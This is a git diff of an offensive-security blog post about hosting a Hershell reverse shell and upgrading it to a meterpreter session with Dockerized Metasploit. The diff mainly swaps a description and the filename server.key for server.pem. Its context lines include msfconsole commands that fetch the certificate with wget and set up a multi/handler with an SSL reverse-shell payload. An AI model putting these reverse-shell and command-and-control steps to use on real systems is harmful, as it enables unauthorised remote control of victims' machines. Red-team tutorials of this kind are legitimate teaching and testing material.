@@ -1,7 +1,7 @@
 ---
 layout: post
 title: "Cloud reverse-shell: Hershell, Metasploit and Docker"
-description: "Offensive cloud tips: Deploying offensive tooling in a golang cloud environment, for free!"
+description: "Quickly deploy a minimal cross-platform shell and host the Command Center using Docker. Upgrade to a meterpreter shell seamlessly"
 thumbnail: chess-knight
 categories: offensive
 excerpt_separator: <!--more-->
@@ -197,7 +197,7 @@ The `nmap` package is also pre installed, meaning we have `ncat` in the containe
 
 We're going to upgrade our hershell to a meterpreter session, using a dockerized Metasploit console.  
 
-Contrary to the previous method, MSF will only need our `server.key` file.
+Contrary to the previous method, MSF will only need our `server.pem` file.
 
 
 To launch our `metasploit` container, we simply do:
@@ -216,13 +216,13 @@ Once the container is up and running, you'll land in a bash shell.
 You'll find all the classic `msf` framework tools.
 
 ![msf](https://github.com/khast3x/khast3x.github.io/blob/master/assets/demo/hershell_msf_binaries.png?raw=true)
-We'll launch the `msfconsole` and let it load. Once you're greeted with the prompt, we'll need to retrieve our `server.key`.
+We'll launch the `msfconsole` and let it load. Once you're greeted with the prompt, we'll need to retrieve our `server.pem`.
 
 We can use `wget` from inside the `msfconsole` and fetch them from our previously mentioned `serve` http page.
 
 ```bash
 msfconsole
-msf5 > wget http://DOCKER-IP:8000/server.key
+msf5 > wget http://DOCKER-IP:8000/server.pem
 
 ```
 
@@ -264,7 +264,7 @@ Use `sessions` to interact with your targets from inside the `msfconsole`  promp
 Let's set Metasploit up to receive both our stages in a single shot. Starting from the top:
 
 ```bash
-msf5 > wget http://DOCKER-IP:8000/server.key
+msf5 > wget http://DOCKER-IP:8000/server.pem
 msf5 > use exploit/multi/handler
 msf5 > set payload python/shell_reverse_tcp_ssl
 msf5 > set HandlerSSLCert ./server.pem
